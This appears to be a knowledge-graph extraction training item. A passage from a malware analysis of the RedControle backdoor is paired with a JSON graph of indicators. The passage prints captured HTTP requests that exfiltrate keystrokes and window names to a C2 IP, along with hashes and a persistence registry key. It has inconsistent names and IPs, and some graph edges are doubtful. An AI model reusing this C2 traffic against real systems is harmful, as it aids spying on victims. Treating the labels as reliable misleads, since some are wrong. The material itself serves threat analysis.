@@ -1,0 +1,107 @@
+
+
+
+Sentence : Malware Analysis
+We were able to recover several recent samples associated with phishing attempts
+connected to the rnp-rosfnet[.]ru domain as well as some older samples tied to trstorg[.]ru
+from July 2017. From what we could gather, “tstorg[.]ru” was originally the website of a
+3/14
+Russian company called “TechnoSnabTorg” involved in the sale of spare parts for drilling
+and road-building equipment; the company specialized in providing parts for Caterpillar,
+Komatsu, Volvo, Fiat, and Hitachi equipment.
+This sample was first submitted to online virus scanners in July 2017 and detected by only
+13 companies at that time:
+SHA256 of 2017 RedControle Sample:
+736aa303b35ee23204e0e7d48cb31f77605234609c2b3d89a054b7c3ec2c0544
+Filenames:
+Актуальный ПРАЙС10.07.2017.exe, ApMsgFwd.exe, SetLogin1Connect.exe
+The backdoor was programmed in Delphi and communicates over HTTP to two C2 servers.
+It sends information about the IP address, hostname, and attached drives in its initial
+communications.
+It first attempts to communicate directly to the IP address “91.211.245[.]246” on TCP port
+80 and then will attempt to communicate to “83.166.242[.]15” on TCP port 17425.
+Keystroke data, clipboard data, as well as window names are communicated in clear text
+via HTTP to the 91.211.245[.]246 in near-real time as the victim interacts with their
+computer.
+The information is collected using a well-known method leveraging the
+SetWindowsHookExA API. Commands are received from the other C2 server
+“83.166.245[.]15” in what appears to be cleartext; however, the backdoor also has the
+ability to communicate over SSL using the Delphi Indy library:
+GET /buffer.php?buffer=--------------------------------------------------------------------
+%0D%0AIDA+
++C%3A%5CDocuments+and+Settings%5CAdministrator%5CDesktop%5Ctst%5CApMs
+gFwd.exe%0D%0A--------------------------------------------------------------------
+%0D%0A17425%0D%0A---------------------------------------------------------------------%0D%0A
+HTTP/1.1
+Host: 91.211.245.246
+Accept: text/html, /
+Accept-Encoding: identity
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+GET /key.php?key=--------------------------------------------------------------------
+%0D%0AC%3A%5CWINDOWS%5Csystem32%5Ccmd.exe+-+FakeNet.exe%0D%0A-
+-------------------------------------------------------------------%0D%0Ahelp%0D%0A%0D%0A----
+----------------------------------------------------------------%0D%0A HTTP/1.1
+Host: 91.211.245.246
+Accept: text/html, /
+Accept-Encoding: identity
+User-Agent: Mozilla/3.0 (compatible; Indy Library)
+Figure 2: Example TCP HTTP Requests Sending Keystroke and Window Data
+4/14
+The backdoor installs itself using the good old-fashioned Run key under the infected user’s
+registry hive
+“HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ApMsgFwd.exe”.
+The backdoor had the ability to upload and download files, manipulate files and folders,
+compress and decompress files using ZLIB, enumerate drive information and host
+information, elevate privileges, capture screenshots and webcam pictures, block and/or
+simulate user input, log keystrokes, and manipulate processes on the infected system.
+Directives from the C2 were randomly broken up by the character “_” in an attempt to likely
+evade HIDS and NIDS signatures such as the command “ST_A_RT_FI_LE”.
+Later versions of RedControle used randomized strings broken up by the same “_”
+character to further hinder signature-based analysis and reverse engineering efforts. In the
+sample Cylance researchers analyzed, the initial connection looked something like this:
+Where the string in BLUE was sent by the C2 server and the string in RED was sent by the
+victim as an initial check in containing the IP address and a unique victim identifier. The
+backdoor operated using a series of threads which were designed to segment different
+backdoor functionality into autonomous threads which ran based on different pre-defined
+Delphi-based timers.
+The backdoor appeared to be a mishmash of different authorship with the keylogger
+portion containing Portuguese language strings and other functions related to process
+manipulation containing references to Slavic language strings. These strings were
+eventually removed or obfuscated in later versions.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "rnp-rosfnet[.]ru", "type" : "CCSH"},
+        {"id": 2, "description": "trstorg[.]ru", "type" : "CCSH"},
+        {"id": 3, "description": "TechnoSnabTorg", "type" : "COUN"},
+        {"id": 4, "description": "736aa303b35ee23204e0e7d48cb31f77605234609c2b3d89a054b7c3ec2c0544", "type" : "IOCS"},
+        {"id": 5, "description": "Актуальный ПРАЙС10.07.2017.exe", "type" : "EXEF"},
+        {"id": 6, "description": "ApMsgFwd.exe", "type" : "EXEF"},
+        {"id": 7, "description": "SetLogin1Connect.exe", "type" : "EXEF"},
+        {"id": 8, "description": "Delphi", "type" : "APPS"},
+        {"id": 9, "description": "HTTP", "type" : "NETP"},
+        {"id": 10, "description": "91.211.245[.]246:80", "type" : "CCSH"},
+        {"id": 11, "description": "83.166.242[.]15:17425", "type" : "CCSH"},
+        {"id": 12, "description": "SetWindowsHookExA API", "type" : "TTPS"},
+        {"id": 13, "description": "91.211.245[.]246", "type" : "CCSH"},
+        {"id": 14, "description": "Delphi Indy library", "type" : "APPS"},
+        {"id": 15, "description": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ApMsgFwd.exe", "type" : "REGI"},
+        {"id": 16, "description": "ZLIB", "type" : "APPS"},
+        {"id": 17, "description": "C2 server", "type" : "CCSH"},
+        {"id": 18, "description": "ST_A_RT_FI_LE", "type" : "TTPS"},
+        {"id": 19, "description": "Portuguese language strings", "type" : "TAMP"},
+        {"id": 20, "description": "Slavic language strings", "type" : "TAMP"}
+    ],
+    "edges": [
+        {"source": 4, "target": 5, "rel_name" : "is_hash_of"},
+        {"source": 4, "target": 6, "rel_name" : "is_hash_of"},
+        {"source": 4, "target": 7, "rel_name" : "is_hash_of"},
+        {"source": 6, "target": 15, "rel_name" : "installed_in"},
+        {"source": 8, "target": 9, "rel_name" : "communicates_over"},
+        {"source": 9, "target": 10, "rel_name" : "sends_data_to"},
+        {"source": 9, "target": 11, "rel_name" : "sends_data_to"},
+        {"source": 12, "target": 13, "rel_name" : "used_by"},
+        {"source": 8, "target": 14, "rel_name" : "uses_library"},
+        {"source": 17, "target": 18, "rel_name" : "sends_commands_as"}
+    ]
+}
